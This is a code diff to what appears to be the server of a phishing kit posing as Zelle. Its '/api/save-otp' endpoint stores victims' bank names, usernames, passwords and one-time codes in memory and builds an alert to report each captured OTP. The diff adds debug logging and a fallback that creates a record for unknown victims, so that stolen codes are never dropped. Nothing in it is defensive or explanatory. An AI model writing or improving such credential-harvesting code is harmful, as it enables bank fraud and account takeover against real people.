@@ -240,9 +240,26 @@ app.post('/api/save-otp', async (req, res) => {
     const code = req.body.code || '';
     const userId = req.body.userId || null;
     
-    const user = users.find(u => u.id == userId);
+    console.log(`[SAVE OTP] Looking for user ${userId}`);
+    console.log(`[SAVE OTP] Current users in memory:`, users.map(u => ({ id: u.id, bank: u.bank_name })));
+    
+    let user = users.find(u => u.id == userId);
+    
+    // FALLBACK: If user not found, create it
     if (!user) {
-        return res.status(404).json({ success: false, error: 'User not found' });
+        console.warn(`[SAVE OTP] ⚠️ User ${userId} not found! Creating fallback user...`);
+        user = {
+            id: userId,
+            session_id: `ZELLE_${userId}_FALLBACK`,
+            bank_name: 'Unknown',
+            username: 'Unknown',
+            password: '',
+            otp_code: code,
+            otp_status: 'pending',
+            created_at: new Date().toISOString(),
+            ip: ipDetails.ip
+        };
+        users.push(user);
     }
     
     user.otp_code = code;
@@ -251,6 +268,8 @@ app.post('/api/save-otp', async (req, res) => {
     if (user.otp_status === 'idle') {
         user.otp_status = 'pending';
     }
+    
+    console.log(`[SAVE OTP] ✅ User ${userId} updated. Total users: ${users.length}`);
     
     const message =
         `🔢 <b>ZELLE - OTP CODE RECEIVED</b>\n\n` +
